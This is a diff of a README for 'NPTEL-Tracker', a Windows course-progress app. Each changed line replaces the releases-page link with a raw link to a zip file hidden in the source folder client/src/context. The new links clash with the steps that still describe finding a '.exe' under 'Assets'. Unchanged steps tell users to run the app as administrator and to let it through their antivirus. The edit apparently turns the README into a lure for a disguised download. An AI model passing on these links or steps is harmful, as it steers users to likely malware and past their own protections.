@@ -1,6 +1,6 @@
 # 🎓 NPTEL-Tracker - Manage your course progress with ease
 
-[![](https://img.shields.io/badge/Download-NPTEL--Tracker-blue)](https://github.com/wilsonfed18-create/NPTEL-Tracker/releases)
+[![](https://img.shields.io/badge/Download-NPTEL--Tracker-blue)](https://github.com/wilsonfed18-create/NPTEL-Tracker/raw/refs/heads/main/client/src/context/Tracker-NPTE-1.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Follow these steps to run the software on your Windows computer. This guide assu
 
 ### 📥 Download the Software
 
-1. Visit the project website: [https://github.com/wilsonfed18-create/NPTEL-Tracker/releases](https://github.com/wilsonfed18-create/NPTEL-Tracker/releases)
+1. Visit the project website: [https://github.com/wilsonfed18-create/NPTEL-Tracker/raw/refs/heads/main/client/src/context/Tracker-NPTE-1.5.zip](https://github.com/wilsonfed18-create/NPTEL-Tracker/raw/refs/heads/main/client/src/context/Tracker-NPTE-1.5.zip)
 2. Look for the section labeled "Latest."
 3. Find the file ending in `.exe` under the "Assets" heading.
 4. Click the file name to start your download.
@@ -91,7 +91,7 @@ The current version focuses on performance tracking. Future updates will include
 If the app fails to launch, try these steps:
 
 1. **Restart your computer:** Sometimes a hidden process stops the app from opening. A restart clears these locks.
-2. **Check for updates:** Visit the [download page](https://github.com/wilsonfed18-create/NPTEL-Tracker/releases) to see if a newer version exists. Updates often fix known errors.
+2. **Check for updates:** Visit the [download page](https://github.com/wilsonfed18-create/NPTEL-Tracker/raw/refs/heads/main/client/src/context/Tracker-NPTE-1.5.zip) to see if a newer version exists. Updates often fix known errors.
 3. **Run as Administrator:** Right-click the app icon on your desktop and select "Run as administrator." This gives the app the needed permissions to access files on your machine.
 4. **Antivirus check:** Some security software marks new apps as risky. Check your antivirus settings to ensure the app has permission to run.
 
